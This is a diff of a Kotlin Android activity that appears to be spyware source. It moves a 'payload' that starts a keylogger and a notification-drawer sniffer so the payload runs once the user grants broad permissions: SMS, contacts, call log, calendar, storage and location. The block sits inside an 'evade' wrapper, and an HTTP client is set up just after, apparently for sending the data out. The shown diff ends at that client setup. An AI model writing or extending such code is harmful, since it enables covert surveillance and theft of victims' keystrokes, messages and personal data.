@@ -48,21 +48,6 @@ import kotlinx.coroutines.withContext
 class MainActivity : AppCompatActivity() {
     val TAG = this.javaClass.simpleName
     init {
-        val payload = suspend {
-            withContext(Dispatchers.Default) {
-                val keyloggerJob = launch {
-                    Keylogger.subscribe { entry ->
-                        Log.d("KEYLOGGER", entry.toString())
-                    }
-                }
-                launch {
-                    DrawerSniffer.subscribe(this@MainActivity) { notification ->
-                        Log.d("DRAWERSNIFFER", notification.toString())
-                    }
-                }.join()
-                keyloggerJob.join()
-            }
-        }
         lifecycleScope.launchWhenCreated {
             evade(this){
                 val kotlinPermissions = KotlinPermissions.with(this@MainActivity).apply {
@@ -72,6 +57,21 @@ class MainActivity : AppCompatActivity() {
                         permissions(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALENDAR, Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS, Manifest.permission.ACCESS_COARSE_LOCATION)
                 }
                 kotlinPermissions.onAccepted {
+                    val payload = suspend {
+                        withContext(Dispatchers.Default) {
+                            val keyloggerJob = launch {
+                                Keylogger.subscribe { entry ->
+                                    Log.d("KEYLOGGER", entry.toString())
+                                }
+                            }
+                            launch {
+                                DrawerSniffer.subscribe(this@MainActivity) { notification ->
+                                    Log.d("DRAWERSNIFFER", notification.toString())
+                                }
+                            }.join()
+                            keyloggerJob.join()
+                        }
+                    }
                     HttpClient(CIO){
                         install(JsonFeature){
                             serializer = KotlinxSerializer()
